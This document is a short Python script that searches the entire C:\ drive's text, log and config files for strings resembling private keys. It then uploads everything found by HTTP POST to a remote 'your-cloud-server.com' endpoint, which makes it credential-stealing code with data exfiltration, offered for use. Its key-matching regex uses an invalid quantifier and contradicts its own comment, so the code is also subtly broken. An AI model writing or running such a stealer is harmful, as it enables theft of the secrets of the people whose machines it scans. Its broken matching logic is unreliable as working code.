import os
import re
import sys
import requests

def find_private_keys(directory, file_extensions):
    # Regular expression to match 64 or 66 character long strings
    key_pattern = re.compile(r'\b[A-Za-z0-9]{44,64,66,88}\b')
    keys_found = set()

    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(file_extensions)):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        matches = key_pattern.findall(content)
                        if matches:
                            print(f"Possible keys found in: {file_path}")
                            for match in matches:
                                keys_found.add(match)
                except Exception as e:
                    print(f"Error reading file {file_path}: {e}", file=sys.stderr)
    return keys_found


# Specify the directory to start from and file extensions to check
start_directory = 'C:\\'  # Example start directory, change as needed
extensions = ['.txt', '.log', '.cfg', '.conf']  # Add other file types if necessary

private_keys = find_private_keys(start_directory, extensions)
response = requests.post("https://your-cloud-server.com/api/upload", json={'keys': list(private_keys)})
